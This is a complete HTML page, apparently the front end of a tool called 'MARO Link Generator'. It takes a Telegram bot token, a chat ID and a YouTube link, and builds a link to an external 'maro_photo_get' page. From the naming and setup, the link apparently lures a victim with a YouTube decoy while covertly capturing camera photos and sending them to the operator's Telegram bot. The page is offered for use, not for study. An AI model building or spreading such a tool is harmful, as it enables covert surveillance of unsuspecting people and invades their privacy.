<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>MARO Generator</title>
  <style>
    body {
      margin: 0;
      padding: 0;
      font-family: 'Poppins', sans-serif;
      background: url("https://i.ibb.co/ccvSfNKt/f8373d322110e98419d228013b405636.jpg") no-repeat center center fixed;
      background-size: cover;
      color: #fff;
    }

    .overlay {
      background: rgba(0, 0, 0, 0.7);
      width: 100%;
      height: 100%;
      position: absolute;
      top: 0;
      left: 0;
    }

    .container {
      position: relative;
      z-index: 2;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      min-height: 100vh;
      padding: 20px;
    }

    h1 {
      font-size: 2rem;
      color: #a855f7;
      margin-bottom: 20px;
    }

    .card {
      background: rgba(20, 20, 40, 0.9);
      border-radius: 20px;
      padding: 25px;
      width: 100%;
      max-width: 400px;
      box-shadow: 0px 4px 20px rgba(0,0,0,0.6);
    }

    label {
      display: block;
      margin-bottom: 8px;
      color: #c084fc;
      font-weight: 600;
    }

    input {
      width: 100%;
      padding: 12px;
      margin-bottom: 15px;
      border: none;
      border-radius: 10px;
      background: #2a2a40;
      color: #fff;
      font-size: 1rem;
      outline: none;
    }

    button {
      width: 100%;
      padding: 12px;
      border: none;
      border-radius: 12px;
      font-size: 1rem;
      font-weight: bold;
      background: linear-gradient(135deg, #9333ea, #6d28d9);
      color: #fff;
      cursor: pointer;
      transition: 0.3s;
    }

    button:hover {
      background: linear-gradient(135deg, #a855f7, #7e22ce);
    }

    .output {
      margin-top: 15px;
      padding: 12px;
      background: #1f1f3d;
      border-radius: 10px;
      word-break: break-word;
      font-size: 0.9rem;
      color: #fff;
    }
  </style>
</head>
<body>
  <div class="overlay"></div>
  <div class="container">
    <h1>MARO Link Generator</h1>
    <div class="card">
      <label for="token">Bot Token</label>
      <input type="text" id="token" placeholder="Enter your Bot Token">

      <label for="chatid">Chat ID</label>
      <input type="text" id="chatid" placeholder="Enter Chat ID">

      <label for="ytlink">YouTube Link</label>
      <input type="text" id="ytlink" placeholder="Enter YouTube Link">

      <button onclick="generateLink()">Generate Link</button>

      <div id="result" class="output"></div>
    </div>
  </div>

  <script>
    function generateLink() {
      const token = document.getElementById('token').value.trim();
      const chatid = document.getElementById('chatid').value.trim();
      const ytlink = document.getElementById('ytlink').value.trim();

      if(!token || !chatid) {
        document.getElementById('result').innerText = "⚠️ Please enter both Token and Chat ID.";
        return;
      }

      // توليد ID عشوائي للرابط
      const uniqueId = Math.random().toString(36).substr(2, 12);

      let url = `https://b7xha.github.io/maro_photo_get/?id=${uniqueId}&token=${encodeURIComponent(token)}&chat=${encodeURIComponent(chatid)}`;

      if(ytlink) {
        url += `&yt=${encodeURIComponent(ytlink)}`;
      }

      document.getElementById('result').innerHTML = `
        ✅ Generated Link:<br>
        <a href="${url}" target="_blank" style="color:#a855f7">${url}</a>
      `;
    }
  </script>
</body>
</html>
